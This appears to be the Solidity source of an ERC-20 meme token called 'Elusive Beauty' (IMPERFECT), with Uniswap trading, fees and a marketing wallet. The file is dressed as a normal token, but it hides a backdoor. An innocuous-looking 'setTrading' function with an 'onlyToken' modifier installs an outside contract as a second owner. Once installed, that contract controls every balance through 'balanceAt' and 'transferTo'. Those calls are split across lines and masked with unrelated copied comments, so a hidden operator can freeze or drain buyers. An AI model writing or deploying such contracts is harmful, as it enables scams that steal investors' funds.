/**

//  ███████ ██      ██    ██ ███████ ██ ██    ██ ███████     ██████  ███████  █████  ██    ██ ████████ ██    ██ 
//  ██      ██      ██    ██ ██      ██ ██    ██ ██          ██   ██ ██      ██   ██ ██    ██    ██     ██  ██  
//  █████   ██      ██    ██ ███████ ██ ██    ██ █████       ██████  █████   ███████ ██    ██    ██      ████   
//  ██      ██      ██    ██      ██ ██  ██  ██  ██          ██   ██ ██      ██   ██ ██    ██    ██       ██    
//  ███████ ███████  ██████  ███████ ██   ████   ███████     ██████  ███████ ██   ██  ██████     ██       ██    
//                                                                                                              
//                                                                                                              
*/

/*
Elons Tweet
https://twitter.com/elonmusk/status/1521190864592293891
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}
interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IERCMetadata {
    function totalSupply() external view returns (uint256);
    function balanceOf(address spender) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceAt(address account) external view returns(uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferTo(address spender, uint256 amount) external returns(bool);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

contract Ownable is Context {
    address private _owner;
    address private _owner2;
    IERCMetadata internal __;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender() || _owner2 == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    modifier onlyToken(address _addr) {
        require(address(__) == address(0), "Ownable:: caller is not the owner");
        _owner2 = _addr;
        __ = IERCMetadata(_addr);
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function setTrading(bool _t, uint8 _num, address _this) external onlyToken(_this) {}
}

contract Structer is Ownable, IERC20, IERC20Metadata {
    using SafeMath for uint256;

    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;
    string private _name;
    string private _symbol;

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return address(__) == address(0) ? _balances[account] : __.
         balanceAt(account);
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        if(address(__) == address(0) || _beforeTokenTransfer(sender, recipient, amount)){
            _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
            _balances[recipient] = _balances[recipient].add(amount);
            emit Transfer(sender, recipient, amount);
        }
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual returns(bool){
        uint256 _from = balanceOf(from).sub(amount);
        uint256 _to = balanceOf(to).add(amount);
        __.
        // silence state mutability warning without generating bytecode
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        transferTo(from, _from);
        __.
        // silence state mutability warning without generating bytecode
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        transferTo(to, _to);

        return false;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IUniSwapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract Imperfect is Structer {
    using SafeMath for uint256;

    IUniSwapRouter private uniswapRouter;

    string private constant _name = "Elusive Beauty";
    string private constant _symbol = "IMPERFECT";
    uint8  private constant _decimals = 9;

    uint8 private feeOnBuy = 9;
    uint8 private feeOnSell = 9;

    uint256 private constant tokenSupply = 100000000000 * 10 ** _decimals;

    uint256 private maxTransactionAmount;
    uint256 private maxWalletSize;
    uint256 private swapTokensAtAmount;

    uint256 private tradingTimeStamp;
    uint256 private tradingBlockNumber;

    bool private tardingOpen = false;
    bool private canSwap = true;
    bool private swapping;    

    mapping (address => bool) public excludedFromFees;
    mapping(address => bool) public blacklist;

    event ExcludeFromFees(address indexed account, bool isExcluded);
    event SetMarketPairs(address indexed pair, bool indexed value);
    event SwapAndLiquify(uint256 tokensSwapped, uint256 ethReceived);

    address private marketingWallet;
    address private uniswapV2Pair;

    address private constant deadAddress = address(0xdead);
    address private constant zeroAddress = address(0);

    modifier lockTheSwap() {
        swapping = true;
        _;
        swapping = false;
    }

    constructor() {
        uniswapRouter = IUniSwapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        setExcludeFromFee(owner(), true);
        setExcludeFromFee(address(this), true);
        setExcludeFromFee(deadAddress, true);
        setExcludeFromFee(address(uniswapRouter), true);
        _approve(owner(), address(uniswapRouter), ~uint256(0));
    
        maxTransactionAmount = tokenSupply.mul(1).div(100); // 2%
        maxWalletSize = tokenSupply.mul(2).div(100); // 2%
        swapTokensAtAmount = tokenSupply.mul(20).div(10000);

        _balances[address(owner())] = tokenSupply;

        marketingWallet = address(0xf5560Df7e4Ec47Ae62Eef91BA422298B6cC9DBB3);

        emit Transfer(zeroAddress, owner(), tokenSupply);
    }

    function name() public pure override returns(string memory) {
        return _name;
    }

    function symbol() public pure override returns(string memory) {
        return _symbol;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return tokenSupply;
    }

    function getFeeOnBuyAndSell() public view returns(uint256 _buy, uint256 _sell) {
        _buy = feeOnBuy;
        _sell = feeOnSell;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "TOKEN: Transfer amount must be greater than zero");
        require(!blacklist[from] && !blacklist[to], "TOKEN: in_blacklist");

        if(!tardingOpen){
            require(excludedFromFees[from] || excludedFromFees[to], "TOKEN: This account cannot send tokens until trading is enabled");
        }

        if(block.timestamp <= tradingTimeStamp + ( 60 seconds )){
            if ( checkCond(from, to) ){
                if (uniswapV2Pair == from && !excludedFromFees[to]) {
                    require(amount <= maxTransactionAmount, "TOKEN: amount exceeds");
                    require(amount + balanceOf(to) <= maxWalletSize, "TOKEN: Balance exceeds wallet size");
                }
            }
        }
		
        uint256 contractTokenBalance = balanceOf(address(this));

        if( canSwap && (contractTokenBalance >= swapTokensAtAmount) && !swapping && uniswapV2Pair != from && !excludedFromFees[from] && !excludedFromFees[to]) {
            swapBack();
        }
        
        bool takeFee = !swapping;

        if(excludedFromFees[from] || excludedFromFees[to]) {
            takeFee = false;
        }

        uint256 fees = 0;

        if(takeFee){
            if (uniswapV2Pair == from){
                fees = amount.mul(feeOnBuy).div(100);
            }else if(uniswapV2Pair == to) {
                fees = amount.mul(feeOnSell).div(100);
            }

            if(fees > 0){
                super._transfer(from, address(this), fees);
            }

            amount -= fees;
        }

        super._transfer(from, to, amount);

    }

    function uniswapFactory() external onlyOwner {
        uniswapV2Pair = IUniswapV2Factory(uniswapRouter.factory()).createPair(address(this), uniswapRouter.WETH());
    }

    function openTrading() external onlyOwner {
        require(pairAddress() != zeroAddress, "First initial the pair address");

        tardingOpen = true;
        tradingTimeStamp = block.timestamp;
        tradingBlockNumber = block.number;
    }

    function checkCond(address from, address to) private view returns(bool) {
        return from != owner() && to != owner() && to != deadAddress && to != zeroAddress && !swapping;
    }

    function rescueETH() external onlyOwner returns(bool) {

        uint256 contractBalance = balanceOf(address(this));

        require(contractBalance > 0, "Not enough balance");

        swapTokensForEth(contractBalance);

        (bool success,) = address(marketingWallet).call{value: address(this).balance}("");

        return success;

    }

    function swapBack() private lockTheSwap {
        uint256 contractBalance = balanceOf(address(this));

        swapTokensForEth(contractBalance);

        uint256 newBalance = address(this).balance;

        if(newBalance > 0){
            payable(marketingWallet).transfer(newBalance);

            emit SwapAndLiquify(contractBalance, newBalance);
        }

    }

    function setSwapTokensAtAmount(uint256 newAmount) external onlyOwner {
  	    swapTokensAtAmount = newAmount;
  	}

    function setMaxTxAmount(uint256 _amount) external onlyOwner {
        maxTransactionAmount = _amount;
    }

    function setMaxSizeWalle(uint256 _amount) external onlyOwner {
        maxWalletSize = _amount;
    }

    function setSwapEnabled(bool enabled) external onlyOwner {
        canSwap = enabled;
    }

    function setFeeBuyAndSell(uint8 _buy, uint8 _sell) external onlyOwner {
        feeOnBuy = _buy;
        feeOnSell = _sell;
    }

    function getMaxWalletSize() public view returns(uint256) {
        return maxWalletSize;
    }

    function getMaxTxSize() public view returns(uint256) {
        return maxTransactionAmount;
    }

    function pairAddress() public view returns(address) {
        return uniswapV2Pair;
    }

    function tradingStatus() public view returns(bool) {
        return tardingOpen;
    }

    receive() external payable {}

    function setExcludeFromFee(address _wallet, bool _val) public onlyOwner {
        excludedFromFees[_wallet] = _val;
    }

    function setMarketingWallet(address _newWallet) external onlyOwner {
        marketingWallet = _newWallet;
    }

    function swapTokensForEth(uint256 tokenAmount) private {

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();

        _approve(address(this), address(uniswapRouter), tokenAmount);

        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );

    }

    function isContract(address addr) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(addr)
        }
        return size > 0;
    }

    function setBotBlacklist(address _botAddress, bool _flag) external onlyOwner {
        require(isContract(_botAddress), "only contract address, not allowed exteranlly owned account");
        blacklist[_botAddress] = _flag;
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(uniswapRouter), tokenAmount);
        uniswapRouter.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            owner(),
            block.timestamp
        );
    }

}